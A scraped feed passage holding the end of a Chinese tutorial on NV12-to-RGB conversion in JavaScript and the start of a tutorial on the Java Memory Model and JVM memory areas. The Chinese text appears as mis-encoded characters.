<span class="hljs-type">const</span> uvIndex = uvRow * width + uvCol Â <span class="hljs-comment">// éœ€è¦ width</span>
</code></pre>
<p><strong>å¦‚æœå®½é«˜é”™è¯¯ä¼šæ€æ ·ï¼Ÿ</strong></p>






























<table><thead><tr><th>é”™è¯¯ç±»å‹</th><th>åæœ</th><th>ä¸¥é‡ç¨‹åº¦</th></tr></thead><tbody><tr><td>æ–‡ä»¶å¤§å°ä¸åŒ¹é…</td><td>éªŒè¯å¤±è´¥ï¼Œæ— æ³•å¤„ç†</td><td>â­â­â­</td></tr><tr><td>Y/UV åˆ†å‰²é”™è¯¯</td><td>è¯»å–é”™è¯¯çš„æ•°æ®æ®µ</td><td>â­â­â­â­â­</td></tr><tr><td>UV ç´¢å¼•é”™è¯¯</td><td>é¢œè‰²å®Œå…¨é”™ä¹±</td><td>â­â­â­â­â­</td></tr><tr><td>æ•°ç»„è¶Šç•Œ</td><td>ç¨‹åºå´©æºƒ</td><td>â­â­â­â­â­</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-32">å¸¸è§é—®é¢˜</h2>
<h3 data-id="heading-33">Q1: å¦‚ä½•è·å– NV12 æ–‡ä»¶çš„å®½é«˜ï¼Ÿ</h3>
<p><strong>æ–¹æ³• 1ï¼šä»è§†é¢‘å…ƒæ•°æ®è·å–</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> videoTrack = stream.<span class="hljs-built_in">getVideoTracks</span>()[<span class="hljs-number">0</span>]
<span class="hljs-type">const</span> settings = videoTrack.<span class="hljs-built_in">getSettings</span>()
<span class="hljs-type">const</span> width = settings.width Â  <span class="hljs-comment">// 1920</span>
<span class="hljs-type">const</span> height = settings.height <span class="hljs-comment">// 1080</span>
</code></pre>
<p><strong>æ–¹æ³• 2ï¼šä»æ–‡ä»¶åè§£æ</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// ä¾‹å¦‚ï¼šframe_1920x1080.nv12</span>
const match = filename<span class="hljs-selector-class">.match</span>(/(\d+)<span class="hljs-built_in">x</span>(\d+)/)
const <span class="hljs-attribute">width</span> = <span class="hljs-built_in">parseInt</span>(match[<span class="hljs-number">1</span>])
const <span class="hljs-attribute">height</span> = <span class="hljs-built_in">parseInt</span>(match[<span class="hljs-number">2</span>])
</code></pre>
<p><strong>æ–¹æ³• 3ï¼šä»é…ç½®æ–‡ä»¶/API</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> response = await <span class="hljs-built_in">fetch</span>(<span class="hljs-string">'/api/video-frame'</span>)
<span class="hljs-type">const</span> { width, height, data } = await response.<span class="hljs-built_in">json</span>()
<span class="hljs-comment">// data æ˜¯ NV12 æ ¼å¼çš„äºŒè¿›åˆ¶æ•°æ®</span>
</code></pre>
<h3 data-id="heading-34">Q2: å¦‚æœå®½é«˜è®¾ç½®é”™è¯¯ä¼šæ€æ ·ï¼Ÿ</h3>
<ul>
<li><strong>æ–‡ä»¶å¤§å°éªŒè¯å¤±è´¥</strong>ï¼šç¨‹åºæ‹’ç»å¤„ç†</li>
<li><strong>æ•°æ®åˆ†å‰²é”™è¯¯</strong>ï¼šY å’Œ UV æ•°æ®è¯»å–ä½ç½®é”™è¯¯</li>
<li><strong>UV ç´¢å¼•é”™è¯¯</strong>ï¼šæ‰€æœ‰é¢œè‰²é”™ä½ï¼Œå›¾åƒå®Œå…¨é”™ä¹±</li>
<li><strong>æ•°ç»„è¶Šç•Œ</strong>ï¼šå¯èƒ½å¯¼è‡´ç¨‹åºå´©æºƒ</li>
</ul>
<h3 data-id="heading-35">Q3: ä¸ºä»€ä¹ˆ UV æ•°æ®è¦åç§» 128ï¼Ÿ</h3>
<p>YUV æ ¼å¼ä¸­ï¼ŒU å’Œ V çš„å€¼èŒƒå›´æ˜¯ 0-255ï¼Œä½†å®é™…è¡¨ç¤ºçš„æ˜¯ -128 åˆ° +127ï¼š</p>
<ul>
<li>0 è¡¨ç¤º -128ï¼ˆæœ€è“/æœ€ç»¿ï¼‰</li>
<li>128 è¡¨ç¤º 0ï¼ˆä¸­æ€§ï¼‰</li>
<li>255 è¡¨ç¤º +127ï¼ˆæœ€çº¢/æœ€é»„ï¼‰</li>
</ul>
<p>æ‰€ä»¥åœ¨è½¬æ¢æ—¶éœ€è¦å‡å» 128 æ¥æ¢å¤çœŸå®å€¼ã€‚</p>
<h3 data-id="heading-36">Q4: å¯ä»¥å¤„ç†å…¶ä»– YUV æ ¼å¼å—ï¼Ÿ</h3>
<p>NV12 æ˜¯ YUV 4:2:0 çš„ä¸€ç§ã€‚å…¶ä»–å¸¸è§æ ¼å¼ï¼š</p>
<ul>
<li><strong>NV21</strong>ï¼šUV é¡ºåºç›¸åï¼ˆVã€Uã€Vã€U...ï¼‰</li>
<li><strong>I420</strong>ï¼šYã€Uã€V åˆ†åˆ«å­˜å‚¨</li>
<li><strong>YV12</strong>ï¼šYã€Vã€U åˆ†åˆ«å­˜å‚¨</li>
</ul>
<p>éœ€è¦ä¿®æ”¹ä»£ç æ¥é€‚é…ä¸åŒçš„æ ¼å¼ã€‚</p>
<h3 data-id="heading-37">Q5: æ€§èƒ½å¦‚ä½•ï¼Ÿ</h3>
<p><strong>æµ‹è¯•ç»“æœï¼ˆ1920Ã—1080 å›¾åƒï¼‰ï¼š</strong></p>
<ul>
<li>è½¬æ¢æ—¶é—´ï¼šçº¦ 20-50msï¼ˆå–å†³äº CPUï¼‰</li>
<li>å†…å­˜å ç”¨ï¼šçº¦ 12MBï¼ˆè¾“å…¥ 3MB + è¾“å‡º 8MBï¼‰</li>
<li>å¸§ç‡ï¼šå¯ä»¥å¤„ç† 20-50 FPS</li>
</ul>
<hr/>
<h2 data-id="heading-38">æ€§èƒ½ä¼˜åŒ–</h2>
<h3 data-id="heading-39">1. ä½¿ç”¨ Web Worker</h3>
<p>å°† CPU å¯†é›†å‹æ“ä½œç§»åˆ°åå°çº¿ç¨‹ï¼Œé¿å…é˜»å¡ UIã€‚</p>
<h3 data-id="heading-40">2. æ•´æ•°è¿ç®—ä¼˜åŒ–</h3>
<p>ä½¿ç”¨ä½è¿ç®—ä»£æ›¿æµ®ç‚¹è¿ç®—ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// æ…¢
<span class="hljs-attr">r</span> = y + <span class="hljs-number">1.402</span> * (v - <span class="hljs-number">128</span>)
â€‹
// å¿«
<span class="hljs-attr">r</span> = y + ((<span class="hljs-number">359</span> * v + <span class="hljs-number">128</span>) &gt;&gt; <span class="hljs-number">8</span>)
</code></pre>
<h3 data-id="heading-41">3. æ‰‹åŠ¨ Clamp</h3>
<p>é¿å…ä½¿ç”¨ <code>Math.min/max</code>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// æ…¢
<span class="hljs-attr">r</span> = Math.max(<span class="hljs-number">0</span>, Math.min(<span class="hljs-number">255</span>, r))
â€‹
// å¿«
<span class="hljs-attr">r</span> = r &lt; <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : r &gt; <span class="hljs-number">255</span> ? <span class="hljs-number">255</span> : r
</code></pre>
<h3 data-id="heading-42">4. å‡å°‘å‡½æ•°è°ƒç”¨</h3>
<p>åœ¨å¾ªç¯ä¸­å†…è”ä»£ç ï¼Œå‡å°‘å‡½æ•°è°ƒç”¨å¼€é”€ã€‚</p>
<h3 data-id="heading-43">5. ä½¿ç”¨ Transferable Objects</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// ä¼ é€’ ArrayBufferï¼Œé¿å…å¤åˆ¶</span>
worker.<span class="hljs-built_in">postMessage</span>({ nv12, width, height }, [nv12.buffer])
</code></pre>
<hr/>
<h2 data-id="heading-44">æ€»ç»“</h2>
<p>NV12 è½¬ RGB çš„æ ¸å¿ƒè¦ç‚¹ï¼š</p>
<ol start="0">
<li><strong>NV12 æ˜¯ YUV 4:2:0 æ ¼å¼</strong>ï¼Œæ•°æ®å¤§å°æ˜¯ RGB çš„ä¸€åŠ</li>
<li><strong>éœ€è¦æå‰çŸ¥é“å®½é«˜</strong>ï¼Œå› ä¸ºæ–‡ä»¶æ²¡æœ‰å…ƒæ•°æ®</li>
<li><strong>ä½¿ç”¨ Web Worker</strong> è¿›è¡Œåå°è½¬æ¢ï¼Œé¿å…é˜»å¡ UI</li>
<li><strong>UV ç´¢å¼•è®¡ç®—æ˜¯å…³é”®</strong>ï¼Œéœ€è¦æ­£ç¡®æ˜ å°„ 4:2:0 é‡‡æ ·</li>
<li><strong>æ•´æ•°è¿ç®—ä¼˜åŒ–</strong>å¯ä»¥æå‡æ€§èƒ½</li>
</ol>
<p>è¿™ä¸ªè½¬æ¢åœ¨è§†é¢‘å¤„ç†ã€å›¾åƒå¤„ç†ã€è°ƒè¯•ç­‰åœºæ™¯ä¸­éå¸¸æœ‰ç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Javaå†…å­˜æ¨¡å‹ï¼ˆJMMï¼‰ä¸JVMå†…å­˜åŒºåŸŸå®Œæ•´è¯¦è§£]]></title>    <link>https://juejin.cn/post/7592540388299440191</link>    <guid>https://juejin.cn/post/7592540388299440191</guid>    <pubDate>2026-01-08T07:19:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592540388299440191" data-draft-id="7592508079306702867" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Javaå†…å­˜æ¨¡å‹ï¼ˆJMMï¼‰ä¸JVMå†…å­˜åŒºåŸŸå®Œæ•´è¯¦è§£"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•,Android"/> <meta itemprop="datePublished" content="2026-01-08T07:19:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é’è²843"/> <meta itemprop="url" content="https://juejin.cn/user/541408646929991"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Javaå†…å­˜æ¨¡å‹ï¼ˆJMMï¼‰ä¸JVMå†…å­˜åŒºåŸŸå®Œæ•´è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/541408646929991/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é’è²843
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:19:58.000Z" title="Thu Jan 08 2026 07:19:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1å°æ—¶+
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">âš ï¸ é‡è¦è¯´æ˜</h2>
<p>æœ¬ç¯‡æ–‡ç« ä»¥JVMå†…å­˜åŒºåŸŸçš„å®é™…å®ç°ä¸ºä¸»ï¼ŒJMMä½œä¸ºç†è®ºåŸºç¡€ç®€è¦ä»‹ç»ã€‚é‡ç‚¹è®²è§£JVMå†…å­˜åŒºåŸŸçš„ç‰©ç†ç»“æ„ã€å¯¹è±¡åˆ›å»ºã€å†…å­˜å¸ƒå±€ç­‰å®é™…å†…å®¹ã€‚</p>
<p><strong>JMMï¼ˆç†è®ºåŸºç¡€ï¼‰</strong>ï¼šç®€è¦ä»‹ç»æŠ½è±¡çš„å†…å­˜è®¿é—®è§„èŒƒ<br/>
<strong>JVMå†…å­˜åŒºåŸŸï¼ˆé‡ç‚¹ï¼‰</strong>ï¼šè¯¦ç»†è®²è§£ç‰©ç†çš„å†…å­˜åˆ’åˆ†å’Œå®é™…å®ç°<br/>
<strong>Androidç›¸å…³</strong>ï¼šè¯´æ˜Androidï¼ˆARTï¼‰ä¸JVMçš„åŒºåˆ«</p>
<hr/>
<h2 data-id="heading-1">ç¬¬ä¸€éƒ¨åˆ†ï¼šJMMåŸºç¡€ç†è®ºï¼ˆç®€è¦ï¼‰</h2>
<h3 data-id="heading-2">1. JMMåŸºæœ¬æ¦‚å¿µ</h3>
<h4 data-id="heading-3">1.1 ä»€ä¹ˆæ˜¯Javaå†…å­˜æ¨¡å‹</h4>
<p><strong>JMMçš„å®šä¹‰ï¼š</strong></p>
<p>Javaå†…å­˜æ¨¡å‹ï¼ˆJava Memory Modelï¼ŒJMMï¼‰æ˜¯Javaè™šæ‹Ÿæœºè§„èŒƒä¸­å®šä¹‰çš„ä¸€ç§è§„èŒƒï¼Œç”¨äºå±è”½ä¸åŒç¡¬ä»¶å¹³å°å’Œæ“ä½œç³»ç»Ÿçš„å†…å­˜è®¿é—®å·®å¼‚ï¼Œä½¿å¾—Javaç¨‹åºåœ¨å„ç§å¹³å°ä¸Šéƒ½èƒ½æ­£ç¡®åœ°è¿è¡Œã€‚</p>
<p><strong>JMMçš„ä½œç”¨ï¼š</strong></p>
<ol>
<li><strong>è§£å†³å¯è§æ€§é—®é¢˜</strong>ï¼šä¿è¯ä¸€ä¸ªçº¿ç¨‹å¯¹å…±äº«å˜é‡çš„ä¿®æ”¹èƒ½å¤Ÿè¢«å…¶ä»–çº¿ç¨‹çœ‹åˆ°</li>
<li><strong>è§£å†³æœ‰åºæ€§é—®é¢˜</strong>ï¼šä¿è¯ç¨‹åºçš„æ‰§è¡Œé¡ºåºæŒ‰ç…§ä»£ç çš„å…ˆåé¡ºåºæ‰§è¡Œ</li>
<li><strong>è§£å†³åŸå­æ€§é—®é¢˜</strong>ï¼šé…åˆå…¶ä»–æœºåˆ¶ä¿è¯æ“ä½œçš„åŸå­æ€§</li>
</ol>
<p><strong>JMMä¸JVMå†…å­˜åŒºåŸŸçš„å…³ç³»ï¼š</strong></p>






























<table><thead><tr><th>ç‰¹æ€§</th><th>JMM</th><th>JVMå†…å­˜åŒºåŸŸ</th></tr></thead><tbody><tr><td><strong>æ€§è´¨</strong></td><td>æŠ½è±¡çš„é€»è¾‘æ¦‚å¿µ</td><td>ç‰©ç†çš„å†…å­˜åˆ’åˆ†</td></tr><tr><td><strong>å…³æ³¨ç‚¹</strong></td><td>å¤šçº¿ç¨‹å¹¶å‘è®¿é—®å…±äº«å˜é‡</td><td>ç¨‹åºè¿è¡Œæ—¶æ•°æ®å­˜å‚¨ä½ç½®</td></tr><tr><td><strong>ä¸»è¦å†…å®¹</strong></td><td>ä¸»å†…å­˜ã€å·¥ä½œå†…å­˜</td><td>å †ã€æ ˆã€æ–¹æ³•åŒºç­‰</td></tr><tr><td><strong>è§£å†³é—®é¢˜</strong></td><td>å¯è§æ€§ã€æœ‰åºæ€§ã€åŸå­æ€§</td><td>æ•°æ®å­˜å‚¨å’Œç®¡ç†</td></tr></tbody></table>
<p><strong>å¯¹åº”å…³ç³»ï¼š</strong></p>
<ul>
<li>JMMä¸­çš„"ä¸»å†…å­˜"ä¸»è¦å¯¹åº”JVMå†…å­˜åŒºåŸŸä¸­çš„"å †"ï¼ˆå­˜æ”¾å¯¹è±¡å®ä¾‹ï¼‰</li>
<li>JMMä¸­çš„"å·¥ä½œå†…å­˜"ä¸»è¦å¯¹åº”JVMå†…å­˜åŒºåŸŸä¸­çš„"è™šæ‹Ÿæœºæ ˆå±€éƒ¨å˜é‡è¡¨"å’Œ"ç¨‹åºè®¡æ•°å™¨"</li>
</ul>
<p><strong>ç¤ºä¾‹è¯´æ˜ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JMMExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// å­˜å‚¨åœ¨å †ä¸­ï¼ˆJVMå†…å­˜åŒºåŸŸï¼‰</span>
                           <span class="hljs-comment">// å¯¹åº”JMMçš„ä¸»å†…å­˜</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">local</span> <span class="hljs-operator">=</span> count;  <span class="hljs-comment">// ä»ä¸»å†…å­˜è¯»å–åˆ°å·¥ä½œå†…å­˜ï¼ˆæ ˆçš„å±€éƒ¨å˜é‡è¡¨ï¼‰</span>
        local = local + <span class="hljs-number">1</span>;  <span class="hljs-comment">// åœ¨å·¥ä½œå†…å­˜ä¸­è®¡ç®—</span>
        count = local;      <span class="hljs-comment">// å†™å›ä¸»å†…å­˜ï¼ˆå †ï¼‰</span>
    }
}
</code></pre>
<h4 data-id="heading-4">1.2 ä¸»å†…å­˜ä¸å·¥ä½œå†…å­˜ï¼ˆç®€è¦ï¼‰</h4>
<p><strong>ä¸»å†…å­˜ï¼ˆMain Memoryï¼‰ï¼š</strong></p>
<p>ä¸»å†…å­˜æ˜¯JMMä¸­çš„ä¸€ä¸ªæŠ½è±¡æ¦‚å¿µï¼Œå®ƒå­˜å‚¨æ‰€æœ‰å…±äº«å˜é‡ã€‚åœ¨ç‰©ç†ä¸Šï¼Œä¸»å†…å­˜ä¸»è¦å¯¹åº”JVMå†…å­˜åŒºåŸŸä¸­çš„å †ã€‚</p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>æ‰€æœ‰çº¿ç¨‹å…±äº«ä¸»å†…å­˜</li>
<li>å…±äº«å˜é‡å­˜å‚¨åœ¨ä¸»å†…å­˜ä¸­</li>
<li>ä¸»å†…å­˜æ˜¯çº¿ç¨‹ä¹‹é—´é€šä¿¡çš„åª’ä»‹</li>
</ul>
<p><strong>å·¥ä½œå†…å­˜ï¼ˆWorking Memoryï¼‰ï¼š</strong></p>
<p>å·¥ä½œå†…å­˜æ˜¯JMMä¸­çš„ä¸€ä¸ªæŠ½è±¡æ¦‚å¿µï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„å·¥ä½œå†…å­˜ã€‚åœ¨ç‰©ç†ä¸Šï¼Œå·¥ä½œå†…å­˜ä¸»è¦å¯¹åº”JVMå†…å­˜åŒºåŸŸä¸­çš„è™šæ‹Ÿæœºæ ˆå±€éƒ¨å˜é‡è¡¨ã€‚</p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>æ¯ä¸ªçº¿ç¨‹æœ‰ç‹¬ç«‹çš„å·¥ä½œå†…å­˜</li>
<li>å·¥ä½œå†…å­˜å­˜å‚¨è¯¥çº¿ç¨‹ä½¿ç”¨çš„å˜é‡çš„å‰¯æœ¬</li>
<li>çº¿ç¨‹ä¸èƒ½ç›´æ¥è®¿é—®ä¸»å†…å­˜ï¼Œåªèƒ½é€šè¿‡å·¥ä½œå†…å­˜è®¿é—®</li>
</ul>
<p><strong>ä¸»å†…å­˜ä¸å·¥ä½œå†…å­˜çš„å…³ç³»ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ä¸»å†…å­˜      â”‚ â† å­˜å‚¨æ‰€æœ‰å…±äº«å˜é‡ï¼ˆå¯¹åº”å †ï¼‰
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â”‚ è¯»å–/å†™å…¥
       â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ å·¥ä½œå†…å­˜<span class="hljs-number">1</span>    â”‚    â”‚ å·¥ä½œå†…å­˜<span class="hljs-number">2</span>    â”‚    â”‚ å·¥ä½œå†…å­˜<span class="hljs-number">3</span>    â”‚
â”‚ (çº¿ç¨‹<span class="hljs-number">1</span>)      â”‚    â”‚ (çº¿ç¨‹<span class="hljs-number">2</span>)      â”‚    â”‚ (çº¿ç¨‹<span class="hljs-number">3</span>)      â”‚
â”‚ (å¯¹åº”æ ˆ)     â”‚    â”‚ (å¯¹åº”æ ˆ)     â”‚    â”‚ (å¯¹åº”æ ˆ)     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>å†…å­˜å¯è§æ€§é—®é¢˜çš„äº§ç”Ÿï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VisibilityProblem</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// ä¸»å†…å­˜ï¼ˆå †ï¼‰ä¸­çš„å…±äº«å˜é‡</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// çº¿ç¨‹1ï¼šä¿®æ”¹flag</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            flag = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// ä¿®æ”¹å·¥ä½œå†…å­˜ä¸­çš„å‰¯æœ¬ï¼Œå¯èƒ½è¿˜æ²¡å†™å›ä¸»å†…å­˜</span>
            System.out.println(<span class="hljs-string">"çº¿ç¨‹1ï¼šflagå·²è®¾ç½®ä¸ºtrue"</span>);
        });
        
        <span class="hljs-comment">// çº¿ç¨‹2ï¼šè¯»å–flag</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">while</span> (!flag) {
                <span class="hljs-comment">// ä»å·¥ä½œå†…å­˜è¯»å–ï¼Œå¯èƒ½çœ‹ä¸åˆ°çº¿ç¨‹1çš„ä¿®æ”¹</span>
                <span class="hljs-comment">// å¯¼è‡´æ— é™å¾ªç¯ï¼</span>
            }
            System.out.println(<span class="hljs-string">"çº¿ç¨‹2ï¼šæ£€æµ‹åˆ°flagä¸ºtrue"</span>);
        });
        
        thread2.start();
        thread1.start();
    }
}
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨volatile</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// volatileä¿è¯å¯è§æ€§</span>
</code></pre>
<h4 data-id="heading-5">1.3 happens-beforeè§„åˆ™ï¼ˆç®€è¦ï¼‰</h4>
<p><strong>happens-beforeå…³ç³»çš„å«ä¹‰ï¼š</strong></p>
<p>happens-beforeæ˜¯JMMä¸­çš„ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼Œç”¨äºæè¿°ä¸¤ä¸ªæ“ä½œä¹‹é—´çš„ååºå…³ç³»ã€‚å¦‚æœæ“ä½œA happens-beforeæ“ä½œBï¼Œé‚£ä¹ˆï¼š</p>
<ul>
<li>æ“ä½œAçš„ç»“æœå¯¹æ“ä½œBå¯è§</li>
<li>æ“ä½œAåœ¨æ“ä½œBä¹‹å‰æ‰§è¡Œ</li>
</ul>
